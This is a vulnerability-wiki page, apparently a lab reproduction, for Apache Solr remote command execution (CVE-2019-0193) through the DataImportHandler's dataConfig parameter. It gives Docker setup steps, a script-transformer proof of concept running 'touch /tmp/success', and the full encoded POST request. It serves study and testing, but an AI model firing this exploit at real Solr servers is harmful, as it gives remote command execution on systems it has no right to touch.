<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/solr/CVE-2019-0193/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache Solr Remote Command Execution (CVE-2019-0193) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache Solr Remote Command Execution (CVE-2019-0193)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache Solr 远程命令执行漏洞（CVE-2019-0193）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2017-12629-XXE/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2017-12629-XXE/README.zh-cn/" class="btn btn-xs btn-link">
        Apache Solr XML 外部实体注入漏洞（CVE-2017-12629）
      </a>
    </div>
    
  </div>

    

    <h1 id="apache-solr-remote-command-execution-cve-2019-0193">Apache Solr Remote Command Execution (CVE-2019-0193)<a class="headerlink" href="#apache-solr-remote-command-execution-cve-2019-0193" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache Solr is an open-source search server. It is written in Java and built upon Apache Lucene. This vulnerability exists in Apache Solr's DataImportHandler, which is an optional but commonly used module for extracting data from databases and other sources. The vulnerability arises because all DIH configurations can be set through the dataConfig parameter in external requests. Since DIH configurations can contain scripts, attackers can execute remote commands by constructing malicious requests.</p>
<p>References:</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA">https://mp.weixin.qq.com/s/typLOXZCev_9WH_Ux0s6oA</a></li>
<li><a href="https://paper.seebug.org/1009/">https://paper.seebug.org/1009/</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start an Apache Solr 8.1.1 server:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server starts, you can access the Apache Solr management interface at <code>http://your-ip:8983/</code>. No authentication is required.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>First, select the <code>demo</code> core from the left sidebar, open the Dataimport panel, enable Debug mode on the right, and enter the following POC:</p>
<div class="highlight"><pre><span></span><code>&lt;dataConfig&gt;
  &lt;script&gt;&lt;![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);
          }
  ]]&gt;&lt;/script&gt;
  &lt;document&gt;
    &lt;entity name=&quot;sample&quot;
            fileName=&quot;.*&quot;
            baseDir=&quot;/&quot;
            processor=&quot;FileListEntityProcessor&quot;
            recursive=&quot;false&quot;
            transformer=&quot;script:poc&quot; /&gt;
  &lt;/document&gt;
&lt;/dataConfig&gt;
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>Click "Execute with this Configuration" to send the following request:</p>
<div class="highlight"><pre><span></span><code>POST /solr/demo/dataimport?_=1708782956647&amp;indent=on&amp;wt=json HTTP/1.1
Host: your-ip:8983
Content-Length: 613
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-type: application/x-www-form-urlencoded
Origin: http://your-ip:8983
Referer: http://your-ip:8983/solr/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close

command=full-import&amp;verbose=false&amp;clean=false&amp;commit=true&amp;debug=true&amp;core=demo&amp;dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEntityProcessor%22%0A++++++++++++recursive%3D%22false%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name=dataimport
</code></pre></div>
<p>Execute <code>docker compose exec solr ls /tmp</code> to enter the container, and you can see that <code>touch /tmp/success</code> has been successfully executed:</p>
<p><img alt="" src="2.jpg" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Apache Solr 远程命令执行漏洞（CVE-2019-0193）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2017-12629-XXE/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2017-12629-XXE/README.zh-cn/" class="btn btn-xs btn-link">
        Apache Solr XML 外部实体注入漏洞（CVE-2017-12629）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>